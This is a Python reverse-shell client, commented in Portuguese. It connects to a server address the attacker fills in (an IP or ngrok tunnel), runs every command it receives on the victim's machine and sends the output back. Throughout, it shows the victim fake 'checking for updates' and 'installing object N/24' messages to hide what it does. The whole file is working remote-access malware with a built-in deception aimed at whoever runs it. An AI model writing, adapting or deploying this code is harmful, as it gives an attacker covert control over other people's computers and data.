import socket
from os import getcwd, chdir, system, name
from subprocess import getoutput as get

# cores

vermelho = '\033[0;31m'
verde = '\033[0;32m'
amarelo = '\033[0;33m'
fim = '\033[m'

# info

ip_servidor = 'Aqui vai seu ip ou ngrok server' 
porta_servidor = 'Sua porta ou porta do ngrok server'
separador = '<->'
c = 0

# conexão

s = socket.socket()

s.connect((ip_servidor, porta_servidor))
print(f'{amarelo}[i] Verificando atualizações...{fim}')

# envio do cwd

s.send(getcwd().encode())

# recebe e tenta executar o comando

while True:
    comando_shell = s.recv(1024).decode()
    if comando_shell.lower() == 'sair':
        s.close()
    if comando_shell.split()[0] == 'cd':
        try:
            chdir(''.join(comando_shell.split()[1]))
        except FileNotFoundError as e:
            result = e
        else:
            result = ''
    else:
        try:
            get(comando_shell)
        except Exception as e:
            result = Exception.__class__
        else:
            result = get(comando_shell)
    mensagem = f'{result}{separador}{getcwd()}'
    s.send(mensagem.encode())
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(f'{amarelo}[i] Instalando objeto {c + 1}/24...{fim}')
    c += 1